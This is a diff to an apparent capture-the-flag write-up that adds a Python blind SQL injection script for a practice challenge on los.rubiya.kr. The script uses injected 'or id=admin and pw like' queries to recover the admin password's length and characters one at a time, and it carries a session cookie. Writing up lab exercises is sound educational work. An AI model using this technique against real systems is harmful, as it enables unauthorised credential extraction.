@@ -103,3 +103,37 @@ Here it the level will be solved if we fetch the row with id = admin but in the 
   highlight_file(__FILE__); 
 ?>
 ```
+Here we can get the actual password using a blind sql Injection . 
+
+Exploit Script 
+
+```
+import requests
+
+letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGJIJKLMNOPQRSTUVWXYZ1234567890'
+
+url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
+h = {
+    "Cookie" : 'PHPSESSID=r4j44kshvu8qe7nk1kfaq1bddb'
+}
+pw = ''
+index = 1
+for i in range(100):
+    q = f"?pw=' or id='admin' and length(pw)={str(i)};-- -"
+    r = requests.get(url+q,headers=h)
+    if 'Hello admin' in r.text:
+        print(f'Length of password : {str(i)}')
+        break
+
+
+while 1:
+    for i in letters:
+        q = f"?pw='  or id='admin' and pw like '{pw}{i}%';-- -"
+        r = requests.get(url+q,headers=h)
+        if 'Hello admin' in r.text:
+            index += 1
+            pw += i
+            break
+        print(q)
+        print(f'Password : {pw}{i}',end='\r')
+        ```
